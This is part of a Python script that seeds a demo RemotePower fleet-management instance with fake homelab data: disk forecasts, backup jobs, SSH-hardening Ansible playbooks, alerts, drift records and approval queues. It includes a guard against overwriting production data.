def build_metrics_history() -> dict:
    """v3.4.0 demo: ~30 days of daily per-mount disk samples so the Forecast
    page can project disk-fill — a fast-filling Nextcloud, a media volume on
    Jellyfin climbing hard, a slow backup riser, and a flat mount (no fill)."""
    DAY = 86400
    n = 30
    # dev_id -> [(mount, total_gb, start_used_gb, gb_per_day), ...]
    plan = {
        'nc01': [('/', 100.0, 62.0, 1.1)],                                  # ~34d
        'jf01': [('/', 50.0, 20.0, 0.15), ('/media', 4000.0, 2700.0, 26.0)],  # media filling
        'bk01': [('/', 64.0, 30.0, 0.05), ('/backup', 2000.0, 980.0, 9.0)],   # backup riser
        'gt01': [('/', 80.0, 33.0, 0.0)],                                    # flat -> no fill
    }
    out = {}
    for dev_id, mounts in plan.items():
        rng = _seeded_random('mhist', dev_id)
        samples = []
        for i in range(n):
            ts = now() - (n - 1 - i) * DAY
            ms = []
            for path, total, start, perday in mounts:
                used = start + perday * i + rng.uniform(-0.2, 0.2) * max(perday, 0.1)
                used = max(0.0, min(total, round(used, 2)))
                ms.append({'path': path, 'used_gb': used, 'total_gb': total})
            samples.append({'ts': ts, 'date': time.strftime('%Y-%m-%d', time.gmtime(ts)),
                            'mounts': ms})
        out[dev_id] = {'samples': samples}
    return out


def _monitored_agented_ids():
    """Device ids that _compute_attention() will actually read — agented and
    monitored. bk01 is intentionally unmonitored, so attention-driving data
    attached to it is suppressed (don't bother seeding it there)."""
    return [d['id'] for d in FAKE_DEVICES
            if not d['agentless'] and d['id'] != 'bk01']


# ─── v3.5.0: Sites ──────────────────────────────────────────────────────────

def build_sites() -> dict:
    """v3.5.0 — sites the fleet is split across. Keyed by site id (the same
    stable ids referenced from build_devices()'s SITE_OF map). Shape mirrors
    handle_site_create: {name, slug, created, created_by}."""
    def slug(name):
        # Mirror _site_slugify: lowercase, non-alnum → '-', collapse, trim.
        out, prev_dash = [], False
        for ch in name.lower():
            if ch.isalnum():
                out.append(ch); prev_dash = False
            elif not prev_dash:
                out.append('-'); prev_dash = True
        return ''.join(out).strip('-')
    return {
        SITE_HQ:   {'name': 'HQ - Copenhagen', 'slug': slug('HQ - Copenhagen'),
                    'created': now() - 86400 * 300, 'created_by': 'demo'},
        SITE_DC:   {'name': 'DC - Frankfurt',  'slug': slug('DC - Frankfurt'),
                    'created': now() - 86400 * 280, 'created_by': 'demo'},
        SITE_EDGE: {'name': 'Edge - London',   'slug': slug('Edge - London'),
                    'created': now() - 86400 * 120, 'created_by': 'demo'},
    }


# ─── v3.5.0: Backup jobs ────────────────────────────────────────────────────

def build_backup_jobs() -> dict:
    """v3.5.0 — scheduled per-device backup commands. Shape mirrors
    handle_backup_job_create."""
    name_of = {d['id']: d['name'] for d in FAKE_DEVICES}
    specs = [
        ('tnas', 'restic tank → offsite',  'restic -r /mnt/backup/restic backup /mnt/data', '0 2 * * *',  True),
        ('pmx01', 'vzdump all guests',     'vzdump --all --mode snapshot --compress zstd --storage pbs', '0 1 * * *', True),
        ('nc01', 'nextcloud db dump',      'mysqldump --single-transaction nextcloud | zstd -o /mnt/data/db/nextcloud.sql.zst', '30 2 * * *', True),
        ('gt01', 'gitea dump',             'docker compose exec -T gitea gitea dump -c /data/gitea/conf/app.ini', '0 3 * * 0', False),
    ]
    jobs = []
    for dev_id, jname, cmd, cron, enabled in specs:
        rng = _seeded_random('backupjob', dev_id)
        jobs.append({
            'id':           _stable_id('backupjob', dev_id, jname),
            'name':         jname,
            'device_id':    dev_id,
            'device_name':  name_of.get(dev_id, dev_id),
            'command':      cmd,
            'cron':         cron,
            'enabled':      enabled,
            'created':      now() - 86400 * rng.randint(30, 120),
            'created_by':   'demo',
            'last_run':     now() - rng.randint(3600, 86400),
            'last_fired_minute': None,
        })
    return {'jobs': jobs}


# ─── v3.6.0: Auto-patch policies ────────────────────────────────────────────

def build_autopatch() -> dict:
    """v3.6.0 — unattended-patch policies. Shape mirrors handle_autopatch_create
    (target.type in all|group|tag|site)."""
    specs = [
        ('Weekly infra patch',   {'type': 'group', 'value': 'infra'},    '0 3 * * 0', True,  True),
        ('Services - nightly',   {'type': 'group', 'value': 'services'}, '0 4 * * *', False, True),
        ('Edge site (London)',   {'type': 'site',  'value': SITE_EDGE},  '0 5 * * 6', True,  True),
        ('Critical hosts only',  {'type': 'tag',   'value': 'critical'}, '0 2 * * 0', True,  False),
    ]
    policies = []
    for pname, target, cron, reboot, enabled in specs:
        rng = _seeded_random('autopatch', pname)
        policies.append({
            'id':           _stable_id('autopatch', pname),
            'name':         pname,
            'target':       target,
            'cron':         cron,
            'reboot':       reboot,
            'enabled':      enabled,
            'created':      now() - 86400 * rng.randint(20, 90),
            'created_by':   'demo',
            'last_run':     now() - rng.randint(3600 * 6, 86400 * 7),
            'last_fired_minute': None,
        })
    return {'policies': policies}


# ─── v3.7.0: Ansible playbooks ──────────────────────────────────────────────

def build_ansible() -> dict:
    """v3.7.0 — stored Ansible playbooks. Shape mirrors
    handle_ansible_playbook_create."""
    harden = ('---\n'
              '- hosts: all\n'
              '  become: true\n'
              '  tasks:\n'
              '    - name: Disable root SSH login\n'
              '      lineinfile:\n'
              '        path: /etc/ssh/sshd_config\n'
              '        regexp: "^#?PermitRootLogin"\n'
              '        line: "PermitRootLogin no"\n'
              '    - name: Disable password auth\n'
              '      lineinfile:\n'
              '        path: /etc/ssh/sshd_config\n'
              '        regexp: "^#?PasswordAuthentication"\n'
              '        line: "PasswordAuthentication no"\n'
              '    - name: Restart sshd\n'
              '      service:\n'
              '        name: ssh\n'
              '        state: restarted\n')
    chrony = ('---\n'
              '- hosts: all\n'
              '  become: true\n'
              '  tasks:\n'
              '    - name: Install chrony\n'
              '      package:\n'
              '        name: chrony\n'
              '        state: present\n'
              '    - name: Enable + start chrony\n'
              '      service:\n'
              '        name: chrony\n'
              '        state: started\n'
              '        enabled: true\n')
    motd = ('---\n'
            '- hosts: all\n'
            '  become: true\n'
            '  tasks:\n'
            '    - name: Set login banner\n'
            '      copy:\n'
            '        dest: /etc/motd\n'
            '        content: "Authorised access only. Managed by RemotePower.\\n"\n')
    specs = [
        ('Harden SSH',          harden, 0,    now() - 86400 * 6),
        ('Ensure NTP (chrony)', chrony, 0,    now() - 86400 * 20),
        ('Set login banner',    motd,   None, 0),   # never run yet
    ]
    playbooks = []
    for pname, content, rc, last_run in specs:
        playbooks.append({
            'id':         _stable_id('ansible', pname),
            'name':       pname,
            'content':    content,
            'created':    now() - 86400 * 30,
            'created_by': 'demo',
            'last_run':   last_run,
            'last_rc':    rc,
        })
    return {'playbooks': playbooks}


# ─── v3.6.0: AV / malware posture ───────────────────────────────────────────

def build_av_status() -> dict:
    """v3.6.0 — endpoint AV posture per monitored device. A couple deliberately
    trigger attention: one ClamAV infection (critical), one stale signature DB
    (>7d → warning), one rkhunter warning (>0 → warning). Shape mirrors
    _ingest_av's cleaned record."""
    out = {}
    # Per-device tuning. (clam_db_age, clam_infected, rk_warnings)
    tuning = {
        'ng01':  (1,  0, 0),
        'jf01':  (3,  2, 0),    # CRITICAL: 2 infected files quarantined
        'nc01':  (12, 0, 0),    # WARNING: signature DB 12d old
        'pi1':   (2,  0, 3),    # WARNING: rkhunter 3 warnings
        'gt01':  (4,  0, 0),
        'vw01':  (1,  0, 0),
        'ha01':  (5,  0, 0),
        'pmx01': (2,  0, 0),
        'tnas':  (6,  0, 0),
        'fw01':  (3,  0, 0),
        'pr01':  (2,  0, 0),
    }
    for dev_id in _monitored_agented_ids():
        db_age, infected, rk_warn = tuning.get(dev_id, (4, 0, 0))
        rng = _seeded_random('av', dev_id)
        out[dev_id] = {
            'collected_at': now() - rng.randint(300, 3600),
            'clamav': {
                'installed':   True,
                'db_age_days': db_age,
                'last_scan_ts': now() - rng.randint(3600, 86400),
                'infected':    infected,
                'warnings':    0,
                'last_run_ts': now() - rng.randint(3600, 86400),
            },
            'rkhunter': {
                'installed':   True,
                'warnings':    rk_warn,
                'last_run_ts': now() - rng.randint(3600, 86400 * 2),
            },
        }
    return out


# ─── v3.6.0: Proxmox per-guest backup recency ───────────────────────────────

def build_proxmox_backups() -> dict:
    """v3.6.0 — per-guest vzdump backup recency cache. Shape mirrors
    _refresh_proxmox_backup_cache's output. One guest is fresh, one is stale
    (>7d → warning), one has no backup at all (age_days None → warning)."""
    guests = [
        {'vmid': 101, 'name': 'web01',   'age_days': 1,    'last_backup': now() - 86400 * 1},
        {'vmid': 102, 'name': 'db01',    'age_days': 2,    'last_backup': now() - 86400 * 2},
        {'vmid': 103, 'name': 'cache01', 'age_days': 12,   'last_backup': now() - 86400 * 12},   # stale
        {'vmid': 104, 'name': 'mail01',  'age_days': 3,    'last_backup': now() - 86400 * 3},
        {'vmid': 110, 'name': 'old-vm',  'age_days': None, 'last_backup': None},                  # never backed up
    ]
    return {'updated_at': now() - 1800, 'node': 'pmx01', 'guests': guests}


# ─── v3.2.x: Alerts inbox ───────────────────────────────────────────────────

def build_alerts() -> dict:
    """v3.2.x alerts inbox — events the operator must act on, with mutable
    ack/resolve state. Shape mirrors _alert_record. Event names are from
    WEBHOOK_EVENTS; severities follow _ALERT_RULES."""
    name_of = {d['id']: d['name'] for d in FAKE_DEVICES}
    # (event, severity, device_id, title, payload, ack_by, resolved_by)
    specs = [
        ('smart_failure',      'high',     'tnas',  'SMART failure on /dev/sdc (truenas.lab)',
         {'device_id': 'tnas', 'device_name': 'truenas.lab'}, None, None),
        ('device_offline',     'critical', 'jf01',  'jellyfin.lab went offline',
         {'device_id': 'jf01', 'device_name': 'jellyfin.lab'}, None, None),
        ('service_down',       'high',     'jf01',  'jellyfin.service is down on jellyfin.lab',
         {'device_id': 'jf01', 'device_name': 'jellyfin.lab', 'unit': 'jellyfin.service'}, 'alice', None),
        ('metric_critical',    'critical', 'nc01',  'Memory at 96% on nextcloud.lab',
         {'device_id': 'nc01', 'device_name': 'nextcloud.lab', 'metric': 'memory', 'value': 96}, None, None),
        ('metric_warning',     'medium',   'pmx01', 'Disk at 84% on proxmox.lab',
         {'device_id': 'pmx01', 'device_name': 'proxmox.lab', 'metric': 'disk', 'value': 84, 'level': 'warning'}, None, None),
        ('cve_found',          'critical', 'nc01',  '1 critical CVE on nextcloud.lab',
         {'device_id': 'nc01', 'device_name': 'nextcloud.lab', 'cve_id': 'CVE-2024-23456', 'severity': 'critical', 'critical': 1}, None, None),
        ('tls_expiry',         'high',     None,    'TLS cert for apps.lab expires in 12 days',
         {'host': 'apps.lab', 'days': 12, 'severity': 'high'}, None, None),
        ('patch_alert',        'medium',   'pmx01', '23 pending updates on proxmox.lab',
         {'device_id': 'pmx01', 'device_name': 'proxmox.lab', 'upgradable': 23}, None, None),
        ('drift_detected',     'medium',   'fw01',  'Config drift: /etc/ssh/sshd_config on opnsense.lab',
         {'device_id': 'fw01', 'device_name': 'opnsense.lab', 'path': '/etc/ssh/sshd_config'}, None, None),
        ('brute_force_detected','high',    'fw01',  'Brute-force SSH attempts on opnsense.lab',
         {'device_id': 'fw01', 'device_name': 'opnsense.lab', 'source_ip': '198.51.100.23', 'count': 142}, 'bob', None),
        ('backup_stale',       'medium',   'gt01',  'Backup older than threshold on gitea.lab',
         {'device_id': 'gt01', 'device_name': 'gitea.lab', 'label': 'gitea-dump', 'age_hours': 52}, None, None),
        ('container_restarting','medium',  'nc01',  'nextcloud-cache restart count climbing',
         {'device_id': 'nc01', 'device_name': 'nextcloud.lab', 'container': 'nextcloud-cache', 'count': 6}, None, None),
        ('kernel_outdated',    'medium',   'pmx01', 'A newer kernel is installed on proxmox.lab — reboot pending',
         {'device_id': 'pmx01', 'device_name': 'proxmox.lab'}, None, None),
        # Resolved examples so the inbox shows the closed state too.
        ('device_offline',     'critical', 'pi1',   'pihole.lab went offline',
         {'device_id': 'pi1', 'device_name': 'pihole.lab'}, 'alice', 'auto'),
        ('service_down',       'high',     'ng01',  'nginx.service was down on nginx.lab',
         {'device_id': 'ng01', 'device_name': 'nginx.lab', 'unit': 'nginx.service'}, 'bob', 'bob'),
    ]
    alerts = []
    for i, (event, sev, dev_id, title, payload, ack_by, resolved_by) in enumerate(specs):
        rng = _seeded_random('alert', i, event)
        ts = now() - rng.randint(600, 86400 * 4)
        rec = {
            'id':              'a-' + _stable_hex('alert', i, event),
            'ts':              ts,
            'event':           event,
            'severity':        sev,
            'title':           title,
            'device_id':       dev_id,
            'device_name':     name_of.get(dev_id, '') if dev_id else (payload.get('host') or ''),
            'payload':         payload,
            'source':          'internal',
            'acknowledged_by': ack_by,
            'acknowledged_at': (ts + rng.randint(120, 3600)) if ack_by else None,
            'resolved_by':     resolved_by,
            'resolved_at':     (ts + rng.randint(3600, 7200)) if resolved_by else None,
        }
        alerts.append(rec)
    # Newest-first, like the live store tends to present.
    alerts.sort(key=lambda a: a['ts'], reverse=True)
    return {'alerts': alerts}


# ─── v2.2.4: Fleet event log ────────────────────────────────────────────────

def build_fleet_events() -> dict:
    """v2.2.4 — immutable fleet event history feeding the Home activity feed.
    Event names MUST be in the JS FLEET_EVENTS set or they won't render.
    Shape mirrors _record_fleet_event: {events: [{ts, event, payload}]}."""
    name_of = {d['id']: d['name'] for d in FAKE_DEVICES}
    # A rotating cast of plausible events over the last few days.
    templates = [
        ('metric_warning',  'pmx01', {'metric': 'disk',   'level': 'warning'}),
        ('metric_warning',  'nc01',  {'metric': 'memory', 'level': 'warning'}),
        ('metric_critical', 'nc01',  {'metric': 'memory', 'level': 'critical'}),
        ('metric_recovered','nc01',  {'metric': 'memory'}),
        ('service_down',    'jf01',  {'unit': 'jellyfin.service'}),
        ('service_up',      'jf01',  {'unit': 'jellyfin.service'}),
        ('device_offline',  'pi1',   {}),
        ('device_online',   'pi1',   {}),
        ('command_executed','gt01',  {'action': 'exec'}),
        ('command_queued',  'tnas',  {'action': 'exec'}),
        ('patch_alert',     'pmx01', {'upgradable': 23}),
        ('cve_found',       'nc01',  {'cve_id': 'CVE-2024-23456', 'severity': 'critical'}),
        ('drift_detected',  'fw01',  {'path': '/etc/ssh/sshd_config'}),
        ('tls_expiry',      None,    {'host': 'apps.lab', 'severity': 'warning'}),
        ('reboot_required', 'pmx01', {}),
        ('image_update_available', 'ng01', {'name': 'nginx'}),
        ('image_updated',   'ng01',  {'name': 'nginx'}),
        ('container_stopped','nc01', {'container': 'nextcloud-cache'}),
        ('brute_force_detected', 'fw01', {'source_ip': '198.51.100.23', 'count': 142}),
        ('ssh_key_added',   'gt01',  {'user': 'git'}),
        ('snmp_unreachable','sw02',  {}),
        ('snmp_recover',    'sw02',  {}),
        ('backup_stale',    'gt01',  {'unit': 'gitea-dump'}),
        ('smart_failure',   'tnas',  {'path': '/dev/sdc'}),
        ('kernel_outdated', 'pmx01', {}),
        ('health_degraded', 'nc01',  {'severity': 'warning'}),
        ('health_recovered','nc01',  {}),
    ]
    events = []
    for i, (event, dev_id, extra) in enumerate(templates):
        rng = _seeded_random('fleetev', i, event)
        ts = now() - rng.randint(300, 86400 * 4)
        payload = dict(extra)
        if dev_id:
            payload['device_id'] = dev_id
            payload['device_name'] = name_of.get(dev_id, dev_id)
        events.append({'ts': ts, 'event': event, 'payload': payload})
    events.sort(key=lambda e: e['ts'])
    return {'events': events}


# ─── v2.2.0: Config drift state ─────────────────────────────────────────────

def build_software_violations() -> dict:
    """v3.11.0 — evaluated software-policy violations (Software policy page table),
    matching the rules seeded in build_config()."""
    return {
        'ng01': {'name': 'nginx.lab', 'checked_at': now() - 3600, 'violations': [
            {'type': 'min_version', 'package': 'openssl',
             'expected': '>= 3.0.2', 'found': '1.1.1n'},
            {'type': 'required', 'package': 'fail2ban',
             'expected': 'installed', 'found': 'missing'},
        ]},
        'jf01': {'name': 'jellyfin.lab', 'checked_at': now() - 7200, 'violations': [
            {'type': 'banned', 'package': 'telnetd',
             'expected': 'not installed', 'found': '0.17-41'},
        ]},
        'gt01': {'name': 'gitea.lab', 'checked_at': now() - 5400, 'violations': [
            {'type': 'required', 'package': 'unattended-upgrades',
             'expected': 'installed', 'found': 'missing'},
        ]},
    }


def build_drift() -> dict:
    """v2.2.0 — file-integrity / config-drift state per device. Keyed by device
    id. Shape mirrors _ingest_drift_report's stored record. A file is "drifted"
    when current_hash != baseline_hash (and exists, not dormant). We seed a
    couple of drifted files plus clean baselines."""
    def _h(*k):
        return hashlib.sha256(('drift|' + repr(k)).encode()).hexdigest()

    # (dev_id, [(path, baseline_size, drifted?), ...])
    plan = {
        'fw01': [('/etc/ssh/sshd_config', 3180, True),     # drifted
                 ('/etc/nftables.conf',   1420, False)],
        'ng01': [('/etc/nginx/nginx.conf', 2710, True),    # drifted
                 ('/etc/ssh/sshd_config',  3201, False)],
        'pmx01':[('/etc/ssh/sshd_config',  3201, False),
                 ('/etc/pve/datacenter.cfg', 540, False)],
        'gt01': [('/etc/ssh/sshd_config',  3201, False)],
        'nc01': [('/etc/ssh/sshd_config',  3201, False),
                 ('/etc/apache2/apache2.conf', 7180, False)],
    }
    out = {}
    for dev_id, files in plan.items():
        rng = _seeded_random('drift', dev_id)
        frec = {}
        for path, size, drifted in files:
            baseline_hash = _h(dev_id, path, 'baseline')
            set_at = now() - 86400 * rng.randint(30, 120)
            if drifted:
                current_hash = _h(dev_id, path, 'current')
                cur_size = size + rng.randint(8, 40)
                changed_at = now() - rng.randint(3600, 86400 * 3)
                history = [{'ts': changed_at, 'hash': current_hash,
                            'size': cur_size, 'exists': True}]
                drift_count = 1
            else:
                current_hash = baseline_hash
                cur_size = size
                changed_at = set_at
                history = []
                drift_count = 0
            frec[path] = {
                'current_hash':    current_hash,
                'current_size':    cur_size,
                'current_mtime':   changed_at,
                'baseline_hash':   baseline_hash,
                'baseline_size':   size,
                'baseline_set_at': set_at,
                'baseline_set_by': 'agent',
                'first_seen':      set_at,
                'last_check':      now() - rng.randint(60, 3600),
                'drift_count':     drift_count,
                'exists':          True,
                'history':         history,
            }
        out[dev_id] = {'files': frec}
    return out


# ─── v3.4.1: Fleet health history ───────────────────────────────────────────

def build_health_history() -> dict:
    """v3.4.1 — 30 days of fleet + per-device health-score trend. Shape mirrors
    _sample_fleet_health's store: {fleet:[{date,ts,score,grade}],
    devices:{id:[{date,ts,score}]}}."""
    def grade(score):
        if score >= 90: return 'A'
        if score >= 80: return 'B'
        if score >= 70: return 'C'
        if score >= 60: return 'D'
        return 'F'
    DAY = 86400
    n = 30
    fleet_rng = _seeded_random('health', 'fleet')
    fleet = []
    for i in range(n):
        ts = now() - (n - 1 - i) * DAY
        # Gentle dip mid-window (an incident), recovering toward the end.
        base = 86 - 10 * (1 if 10 <= i <= 16 else 0)
        score = int(max(55, min(98, base + fleet_rng.gauss(0, 3))))
        fleet.append({'date': datetime.date.fromtimestamp(ts).isoformat(),
                      'ts': ts, 'score': score, 'grade': grade(score)})
    devices = {}
    for dev_id in _monitored_agented_ids():
        rng = _seeded_random('health', dev_id)
        baseline = rng.randint(68, 95)
        series = []
        for i in range(n):
            ts = now() - (n - 1 - i) * DAY
            score = int(max(40, min(100, baseline + rng.gauss(0, 4))))
            series.append({'date': datetime.date.fromtimestamp(ts).isoformat(),
                           'ts': ts, 'score': score})
        devices[dev_id] = series
    return {'fleet': fleet, 'devices': devices}


# ─── v3.7.0: Maker-checker pending confirmations ────────────────────────────

def build_confirmations() -> dict:
    """v3.7.0 — maker-checker confirmation queue. Shape mirrors
    _create_confirmation. A few pending (awaiting a second admin) plus a couple
    already decided. requested_by is an admin so the approve flow demos (a
    different admin must approve — self-approval is blocked)."""
    specs = [
        # (action, device_id, params, requested_by, status, decided_by, age_s)
        ('exec_command', 'pmx01', {'command': 'apt full-upgrade -y'},          'alice', 'pending',  None,    1800),
        ('reboot',       'nc01',  {},                                          'bob',   'pending',  None,    3600),
        ('exec_command', 'tnas',  {'command': 'zpool clear tank'},             'alice', 'pending',  None,    600),
        ('exec_command', 'gt01',  {'command': 'docker compose pull && docker compose up -d'}, 'bob', 'approved', 'alice', 86400),
        ('exec_command', 'fw01',  {'command': 'rm -rf /tmp/old-rules'},        'alice', 'rejected', 'bob',   86400 * 2),
    ]
    confirmations = []
    for i, (action, dev_id, params, req_by, status, decided_by, age) in enumerate(specs):
        requested_at = now() - age
        entry = {
            'id':           'cf_' + _stable_hex('confirm', i, action),
            'action':       action,
            'device_id':    dev_id,
            'params':       params,
            'requested_by': req_by,
            'requested_at': requested_at,
            'ai_host':      None,
            'ai_prompt':    None,
            'status':       status,
            'decided_by':   decided_by,
            'decided_at':   (requested_at + 1200) if decided_by else None,
        }
        confirmations.append(entry)
    return {'confirmations': confirmations}


# Maps file basename → builder. Each builder returns the JSON-able payload.
BUILDERS = {
    'users.json':            build_users,
    'devices.json':          build_devices,
    'hardware.json':         build_hardware,
    'metrics_history.json':  build_metrics_history,
    'metrics.json':           build_metrics,
    'containers.json':       build_containers,
    'monitor_history.json':  build_monitor_history,
    'cve_findings.json':     build_cve_findings,
    'kev_epss.json':         build_kev_epss,
    'packages.json':         build_packages,
    'cmdb.json':             build_cmdb,
    'history.json':          build_history,
    'audit_log.json':        build_audit_log,
    'tls_targets.json':      build_tls_targets,
    'tls_results.json':      build_tls_results,
    'config.json':           build_config,
    'links.json':            build_links,
    # v2.2.0 demo content
    'scripts.json':          build_scripts,
    'batch_jobs.json':       build_batch_jobs,
    'log_watch.json':        build_log_watch,
    # v3.0.2 demo content
    'self_backup_state.json':      build_self_backup_state,
    'ignored_items.json':          build_ignored_items,
    'acme_state.json':             build_acme_state,
    'port_baseline.json':          build_port_baseline,
    'ssh_key_baseline.json':       build_ssh_key_baseline,
    'brute_force.json':            build_brute_force,
    'proxmox_snapshot_cache.json': build_proxmox_snapshot_cache,
    'uptime.json':                 build_uptime,
    # v3.5.0 demo content
    'sites.json':                  build_sites,
    'backup_jobs.json':            build_backup_jobs,
    # v3.6.0 demo content
    'autopatch_policies.json':     build_autopatch,
    'av_status.json':              build_av_status,
    'proxmox_backup_cache.json':   build_proxmox_backups,
    # v3.7.0 demo content
    'ansible_playbooks.json':      build_ansible,
    'pending_confirmations.json':  build_confirmations,
    # v3.2.x / v3.4.1 dashboard content
    'alerts.json':                 build_alerts,
    'fleet_events.json':           build_fleet_events,
    'drift_state.json':            build_drift,
    'health_history.json':         build_health_history,
    # v3.11.0 / v3.13.0 demo content
    'software_violations.json':    build_software_violations,
}


def main():
    p = argparse.ArgumentParser(description='Seed the RemotePower data dir with a fake homelab')
    p.add_argument('--data-dir', default=str(DEFAULT_DATA_DIR),
                   help=f'Where to write JSON files (default: {DEFAULT_DATA_DIR})')
    p.add_argument('--apply', action='store_true',
                   help='Actually write the files (default is dry-run)')
    p.add_argument('--quiet', action='store_true',
                   help='Suppress per-file output (useful for cron)')
    # Undocumented escape hatch for the rare empty-but-protected-path case.
    # It can NEVER bypass the real-accounts check — see _guard_demo_target.
    p.add_argument('--i-know-this-is-not-a-demo-dir', dest='override',
                   action='store_true', help=argparse.SUPPRESS)
    args = p.parse_args()

    target = Path(args.data_dir)
    print(f"Target data dir: {target.resolve() if target.exists() else target}")
    if not args.apply:
        print(f"Dry-run. Would write {len(BUILDERS)} files to {target}/")
        for name in BUILDERS:
            print(f"  {target}/{name}")
        # Surface the guard verdict in the dry-run too, so operators see it
        # before they reach for --apply.
        ok, reason = _guard_demo_target(target, override=args.override)
        if not ok:
            print(f"\n⚠ --apply WOULD BE BLOCKED: {reason}")
        print("\nRe-run with --apply to actually write.")
        return 0

    # Safety guard: never let --apply clobber a production data dir.
    ok, reason = _guard_demo_target(target, override=args.override)
    if not ok:
        sys.stderr.write(
            "\nREFUSING TO SEED — this does not look like a demo data dir.\n"
            f"  {reason}\n\n"
            "Seeding writes FAKE data and would overwrite whatever is there.\n")
        return 2

    target.mkdir(parents=True, exist_ok=True)

    # When run as root, write the files owned by whoever owns the data dir (the
    # CGI user, e.g. www-data) — otherwise they end up root:root mode 600, the
    # server process can't read them, and it falls back to its default admin so
    # the instance looks un-seeded (devices empty, demo/demo login missing).
    _own_uid = _own_gid = -1
    try:
        if hasattr(os, 'geteuid') and os.geteuid() == 0:
            _st = target.stat()
            if _st.st_uid != 0:        # dir belongs to a service user — match it
                _own_uid, _own_gid = _st.st_uid, _st.st_gid
                print(f"Running as root; writing files owned by uid={_own_uid} "
                      f"(the data dir's owner) so the server can read them.")
    except OSError:
        pass

    def _fix_owner(p):
        if _own_uid >= 0:
            try:
                os.chown(str(p), _own_uid, _own_gid)
            except OSError:
                pass

    for name, builder in BUILDERS.items():
        path = target / name
        data = builder()
        # We don't go through the api.save() helper because we want the
        # script to be standalone — no api.py import needed. Atomic
        # rename mimics what api.save() does.
        tmp = path.with_name(path.name + '.tmp.' + str(os.getpid()))
        with tmp.open('w') as f:
            json.dump(data, f, indent=2)
        os.replace(str(tmp), str(path))
        try:
            os.chmod(str(path), 0o600)
        except OSError:
            pass
        _fix_owner(path)
        if not args.quiet:
            print(f"  ✓ {path}")

    # Mark this dir as a sanctioned demo target so future (e.g. cron) re-seeds
    # pass the guard without manual intervention.
    try:
        (target / DEMO_MARKER).write_text(
            'This dir is a RemotePower DEMO data dir, seeded with fake data by '
            'seed-demo-data.py. Do not point a production server at it.\n')
        _fix_owner(target / DEMO_MARKER)
    except OSError:
        pass

    if not args.quiet:
        print(f"\n✓ Seeded {len(BUILDERS)} files in {target}/")
        print("\nLogin: demo / demo (viewer role)")
        print("Set RP_READ_ONLY=1 in the systemd / fcgiwrap environment to enforce read-only.")
    return 0


if __name__ == '__main__':
    sys.exit(main())
